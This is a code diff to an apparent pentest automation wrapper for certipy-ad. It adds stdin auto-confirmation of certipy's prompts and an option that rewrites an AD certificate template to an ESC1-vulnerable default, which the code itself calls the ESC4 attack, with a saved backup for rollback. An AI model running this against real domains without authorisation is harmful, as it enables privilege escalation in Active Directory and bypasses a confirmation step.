@@ -166,6 +166,7 @@ async def run_certipy(
     subcommand: str,
     args: list[str],
     timeout: int = 60,
+    input_data: bytes | None = None,
 ) -> dict[str, Any]:
     """Run a certipy-ad command and return parsed output.
 
@@ -194,12 +195,20 @@ async def run_certipy(
         subcommand: The certipy subcommand to invoke.
         args: Additional CLI arguments for the subcommand.
         timeout: Maximum seconds to wait for the subprocess.
+        input_data: Optional bytes to write to certipy's stdin.  Used to
+            auto-confirm interactive prompts (e.g. ``certipy template``
+            asks "Are you sure you want to apply these changes?").
+            Pass ``b"y\\n"`` to confirm.  Subprocess capture mode keeps
+            stdin attached as a pipe so unattended pentest automation
+            never hangs on a prompt.
 
     Returns:
         Standardised result dict with ``success``, ``output``, ``parsed``,
         and ``error`` keys.
     """
-    result = await _run_certipy_once(subcommand, args, timeout=timeout)
+    result = await _run_certipy_once(
+        subcommand, args, timeout=timeout, input_data=input_data,
+    )
 
     # LDAPS → plain-LDAP auto-retry, but only when the caller hasn't
     # already pinned a scheme.
@@ -211,7 +220,7 @@ async def run_certipy(
         )
         retry_args = ["-ldap-scheme", "ldap"] + list(args)
         retry_result = await _run_certipy_once(
-            subcommand, retry_args, timeout=timeout,
+            subcommand, retry_args, timeout=timeout, input_data=input_data,
         )
         retry_result["ldaps_retry"] = True
         retry_result["ldaps_first_error"] = first_error
@@ -229,6 +238,7 @@ async def _run_certipy_once(
     subcommand: str,
     args: list[str],
     timeout: int = 60,
+    input_data: bytes | None = None,
 ) -> dict[str, Any]:
     """Execute a single certipy invocation. Caller orchestrates retries.
 
@@ -250,13 +260,18 @@ async def _run_certipy_once(
     }
 
     try:
+        # When auto-confirming a prompt (input_data set), open stdin
+        # as a pipe so communicate() can write to it.  Otherwise leave
+        # stdin attached to the parent's null device so certipy gets
+        # an immediate EOF on any unexpected read.
         proc = await asyncio.create_subprocess_exec(
             *cmd,
+            stdin=asyncio.subprocess.PIPE if input_data is not None else asyncio.subprocess.DEVNULL,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
         stdout_bytes, stderr_bytes = await asyncio.wait_for(
-            proc.communicate(), timeout=timeout
+            proc.communicate(input=input_data), timeout=timeout
         )
 
         stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
@@ -976,7 +991,9 @@ async def certipy_template(
     auth_args: list[str],
     save_old: bool = True,
     configuration: dict[str, Any] | None = None,
-    timeout: int = 60,
+    write_default: bool = False,
+    target_ip: str | None = None,
+    timeout: int = 120,
 ) -> dict[str, Any]:
     """Modify a certificate template configuration.
 
@@ -984,18 +1001,49 @@ async def certipy_template(
     to restore the original configuration.
 
     Args:
-        target: Domain controller host or IP.
+        target: Hostname (preferably FQDN) for ``-target``.  Used for
+            the LDAP write that updates the template object.  Pass the
+            DC FQDN here and use *target_ip* to override DNS resolution.
         template: Certificate template name.
         auth_args: Authentication arguments.
-        save_old: If ``True``, save the old template configuration to a JSON file.
-        configuration: Optional JSON configuration file path to apply (for restore).
+        save_old: If ``True``, save the old template configuration to a
+            JSON file before modifying — the path ends up in
+            ``parsed["old_config_path"]`` so callers can pass it back
+            via ``configuration`` to roll back.
+        configuration: Optional dict with ``"config_path"`` pointing at
+            a previously-saved JSON config to write back.  Used by ESC4
+            rollback / handlers' restore step.
+        write_default: When ``True``, pass ``-write-default-configuration``
+            so certipy rewrites the template to its default
+            ESC1-vulnerable shape (the actual ESC4 attack).  Without
+            this, the command is a no-op or save-only.
+        target_ip: Explicit IP override for *target* — passed via
+            ``-target-ip`` so certipy bypasses DNS resolution.  Same
+            pattern as :func:`certipy_request`; necessary on attacker
+            hosts that don't have ``/etc/hosts`` entries for the target
+            domain.
+        timeout: Maximum seconds to wait.  Default raised to 120s
+            because template-write operations involve LDAP roundtrips
+            plus an interactive prompt confirmation; the previous 60s
+            default fired before certipy could finish on slower DCs.
 
     Returns:
         Result dict. On success, ``parsed["old_config_path"]`` may contain
         the path to the saved original configuration.
+
+    Notes:
+        certipy ``template`` interactively asks "Are you sure you want
+        to apply these changes?" with no flag to suppress the prompt.
+        We auto-confirm by piping ``y\\n`` to stdin so unattended
+        pentest automation never hangs.  See :func:`run_certipy` for
+        the stdin plumbing.
     """
     args = ["-target", target, "-template", template] + auth_args
 
+    if target_ip:
+        args.extend(["-target-ip", target_ip])
+    if write_default:
+        args.append("-write-default-configuration")
     if save_old:
         # certipy uses -save-configuration <file>, not -save-old
         args.extend(["-save-configuration", f"{template}_backup.json"])
@@ -1005,7 +1053,12 @@ async def certipy_template(
             # certipy uses -write-configuration, not -configuration
             args.extend(["-write-configuration", config_path])
 
-    return await run_certipy("template", args, timeout=timeout)
+    # Auto-confirm the "Are you sure?" prompt.  Multiple newlines
+    # cover any second prompt certipy v5 might ask (it's stable in v5
+    # but defending against future versions costs nothing here).
+    return await run_certipy(
+        "template", args, timeout=timeout, input_data=b"y\ny\ny\n",
+    )
 
 
 async def certipy_account(
